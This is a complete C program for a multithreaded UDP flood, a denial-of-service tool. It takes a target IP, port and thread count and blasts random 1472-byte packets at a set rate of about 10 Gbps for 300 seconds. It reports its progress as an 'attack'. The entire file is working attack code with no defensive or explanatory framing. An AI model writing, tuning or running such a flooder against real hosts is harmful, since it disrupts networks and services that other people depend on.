#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <sched.h>
#include <sys/mman.h>
#include <netinet/tcp.h>  // Added for TCP_NODELAY

#define MAX_THREADS 64
#define PACKET_SIZE 1472
#define ATTACK_DURATION 300
#define TARGET_MBPS 10000
#define TARGET_PPS 850000

typedef struct {
    int sock;
    struct sockaddr_in target_addr;
    int thread_id;
    volatile int *running;
    unsigned long long packets_sent;
    cpu_set_t cpu_set;
} thread_data_t;

__attribute__((aligned(64))) static char packets[16][PACKET_SIZE];

void init_packets() {
    for (int i = 0; i < 16; i++) {
        for (int j = 0; j < PACKET_SIZE; j++) {
            packets[i][j] = rand() % 256;
        }
        packets[i][0] = i;
        packets[i][1] = rand() % 256;
    }
}

void* flood_thread(void* arg) {
    thread_data_t* data = (thread_data_t*)arg;
    
    // Set CPU affinity
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &data->cpu_set);
    
    unsigned long long packets_sent = 0;
    int packet_index = 0;
    struct timespec start_ts, current_ts;
    
    clock_gettime(CLOCK_MONOTONIC, &start_ts);
    
    while (*(data->running)) {
        for (int burst = 0; burst < 32; burst++) {
            sendto(data->sock, packets[packet_index], PACKET_SIZE, MSG_DONTWAIT, 
                  (struct sockaddr*)&data->target_addr, sizeof(data->target_addr));
            
            packets_sent++;
            packet_index = (packet_index + 1) % 16;
        }
        
        if ((packets_sent & 0x3FF) == 0) {
            clock_gettime(CLOCK_MONOTONIC, &current_ts);
            long elapsed_ns = (current_ts.tv_sec - start_ts.tv_sec) * 1000000000L + 
                             (current_ts.tv_nsec - start_ts.tv_nsec);
            
            long expected_packets = (elapsed_ns * TARGET_PPS) / 1000000000L;
            if (packets_sent > expected_packets + 10000) {
                usleep(100);
            }
        }
    }
    
    data->packets_sent = packets_sent;
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <TARGET_IP> <TARGET_PORT> <THREAD_COUNT>\n", argv[0]);
        printf("Recommended: 16-48 threads\n");
        exit(1);
    }

    char* target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int thread_count = atoi(argv[3]);
    
    if (thread_count > MAX_THREADS) {
        printf("Thread count too high. Maximum: %d\n", MAX_THREADS);
        exit(1);
    }

    printf("Starting 10 Gbps UDP Flood Attack:\n");
    printf("Target: %s:%d\n", target_ip, target_port);
    printf("Threads: %d\n", thread_count);
    printf("Target Rate: %d Mbps (~%d packets/sec)\n", TARGET_MBPS, TARGET_PPS);
    printf("Packet Size: %d bytes\n", PACKET_SIZE);
    printf("Duration: %d seconds\n\n", ATTACK_DURATION);

    if (mlockall(MCL_CURRENT | MCL_FUTURE) == -1) {
        perror("Warning: Could not lock memory");
    }

    srand(time(NULL));
    init_packets();

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == -1) {
        perror("Socket creation failed");
        exit(1);
    }

    int optval = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    
    int sendbuf_size = 10 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf_size, sizeof(sendbuf_size));
    
    // TCP_NODELAY is for TCP sockets, but we'll keep it for completeness
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval));

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    if (inet_pton(AF_INET, target_ip, &target_addr.sin_addr) <= 0) {
        perror("Invalid target IP address");
        close(sock);
        exit(1);
    }

    pthread_t threads[MAX_THREADS];
    thread_data_t thread_data[MAX_THREADS];
    volatile int running = 1;
    clock_t start_time = clock();

    printf("Initializing %d flood threads...\n", thread_count);
    
    for (int i = 0; i < thread_count; i++) {
        thread_data[i].sock = sock;
        thread_data[i].target_addr = target_addr;
        thread_data[i].thread_id = i;
        thread_data[i].running = &running;
        thread_data[i].packets_sent = 0;
        
        CPU_ZERO(&thread_data[i].cpu_set);
        CPU_SET(i % sysconf(_SC_NPROCESSORS_ONLN), &thread_data[i].cpu_set);
        
        if (pthread_create(&threads[i], NULL, flood_thread, &thread_data[i]) != 0) {
            perror("Thread creation failed");
            running = 0;
            break;
        }
    }

    printf("Attack running for %d seconds...\n", ATTACK_DURATION);
    
    unsigned long long total_prev = 0;
    struct timespec monitor_start, monitor_now;
    clock_gettime(CLOCK_MONOTONIC, &monitor_start);
    
    while ((clock() - start_time) / CLOCKS_PER_SEC < ATTACK_DURATION) {
        sleep(1);
        
        clock_gettime(CLOCK_MONOTONIC, &monitor_now);
        long elapsed_ms = (monitor_now.tv_sec - monitor_start.tv_sec) * 1000 + 
                         (monitor_now.tv_nsec - monitor_start.tv_nsec) / 1000000;
        
        unsigned long long total_current = 0;
        for (int i = 0; i < thread_count; i++) {
            total_current += thread_data[i].packets_sent;
        }
        
        double interval_pps = (double)(total_current - total_prev) * 1000.0 / elapsed_ms;
        double interval_mbps = (interval_pps * PACKET_SIZE * 8) / (1024.0 * 1024.0);
        
        printf("Current: %.2f Mbps (%.0f pps) | Total: %llu packets\n", 
               interval_mbps, interval_pps, total_current);
        
        total_prev = total_current;
        monitor_start = monitor_now;
    }

    running = 0;
    printf("Stopping threads...\n");
    
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    unsigned long long total_packets = 0;
    for (int i = 0; i < thread_count; i++) {
        total_packets += thread_data[i].packets_sent;
    }
    
    double total_mbps = (total_packets * PACKET_SIZE * 8) / 
                       (ATTACK_DURATION * 1024.0 * 1024.0);
    double avg_pps = total_packets / (double)ATTACK_DURATION;
    double efficiency = (total_mbps / TARGET_MBPS) * 100;

    printf("\nAttack Completed!\n");
    printf("Total packets sent: %llu\n", total_packets);
    printf("Average throughput: %.2f Mbps\n", total_mbps);
    printf("Average packets/sec: %.0f\n", avg_pps);
    printf("Target achieved: %.1f%%\n", efficiency);

    close(sock);
    return 0;
}
